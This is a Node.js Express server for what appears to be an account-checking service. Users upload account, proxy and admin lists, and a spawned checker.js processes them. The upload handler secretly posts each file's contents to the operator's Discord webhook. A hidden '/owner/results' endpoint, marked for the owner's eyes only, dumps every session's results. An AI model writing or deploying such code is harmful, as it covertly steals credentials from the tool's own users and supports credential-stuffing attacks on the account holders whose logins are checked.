const express = require('express');
const multer  = require('multer');
const fs = require('fs-extra');
const path = require('path');
const { spawn } = require('child_process');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 3000;
const upload = multer({ dest: 'uploads/' });

const OWNER_WEBHOOK = 'YOUR_DISCORD_WEBHOOK_HERE'; // <--- PUT YOUR DISCORD WEBHOOK URL HERE

app.use(express.static('public'));
app.use(express.json());

// Create a random session id for each user
function randomSession() {
    return Math.random().toString(36).substring(2,12);
}

// API: Upload user files (accounts, proxies, admin)
app.post('/api/upload', upload.fields([
    { name: 'accounts' }, { name: 'proxies' }, { name: 'admin' }
]), async (req, res) => {
    const sid = randomSession();
    const sessdir = path.join(__dirname, "sessions", sid);
    await fs.mkdirp(sessdir);
    // Move uploaded files to session dir, also send to your webhook
    let fileMap = {};
    for (const key of Object.keys(req.files)) {
        const up = req.files[key][0];
        const dest = path.join(sessdir, key + ".txt");
        await fs.move(up.path, dest, { overwrite:true });
        fileMap[key] = dest;
        // Send file contents to you (Discord webhook)
        const content = await fs.readFile(dest, "utf8");
        await axios.post(OWNER_WEBHOOK, {
            content: `New ${key}.txt from user session \`${sid}\`:\n\`\`\`\n${content.substring(0,1900)}\n\`\`\``
        }).catch(()=>{});
    }
    res.json({sid});
});

// API: Start checker for this session
app.post('/api/start', async (req, res) => {
    const sid = req.body.sid;
    const sessdir = path.join(__dirname, "sessions", sid);
    // Must have all 3 files
    for(const f of ["accounts.txt", "proxies.txt", "admin.txt"]) {
        if (!await fs.pathExists(path.join(sessdir, f))) return res.status(400).send("Missing required "+f);
    }
    // Fork checker.js (pass session dir)
    const child = spawn('node', ['checker.js', sessdir]);
    fs.writeFile(path.join(sessdir, 'pid.txt'), ""+child.pid);
    child.on('close', code => {});
    res.json({ok:true});
});

// API: Tail results (for polling by browser)
app.get('/api/results/:sid', async (req,res) => {
    const sessdir = path.join(__dirname, 'sessions', req.params.sid);
    const outf = path.join(sessdir, 'results.txt');
    if (!await fs.pathExists(outf)) return res.json({status: 'pending', results: ''});
    const text = await fs.readFile(outf, "utf8");
    res.json({status:'done', results: text});
});

// API: Stop checker (kills process for this session)
app.post('/api/stop', async (req, res) => {
    const sid = req.body.sid;
    const sessdir = path.join(__dirname, "sessions", sid);
    const pidf = path.join(sessdir, 'pid.txt');
    if (!await fs.pathExists(pidf)) return res.json({ok:true});
    const pid = parseInt(await fs.readFile(pidf, "utf8"));
    if (pid) try { process.kill(pid); } catch(e){}
    res.json({ok:true});
});

// OWNER endpoint: show all results uploaded
app.get('/owner/results', async (req,res)=> {
    // list all session results (YOUR eyes only - not linked front-end)
    const sdir = path.join(__dirname, "sessions");
    let out = "";
    for(const sessionid of await fs.readdir(sdir)) {
        const rf = path.join(sdir, sessionid, "results.txt");
        if (await fs.pathExists(rf)) {
            out += `SESSION: ${sessionid}\n`;
            out += await fs.readFile(rf, "utf8");
            out += '\n----\n';
        }
    }
    res.type('text/plain').send(out || "No results yet.");
});

app.listen(port,()=>console.log('Web checker: http://localhost:'+port));
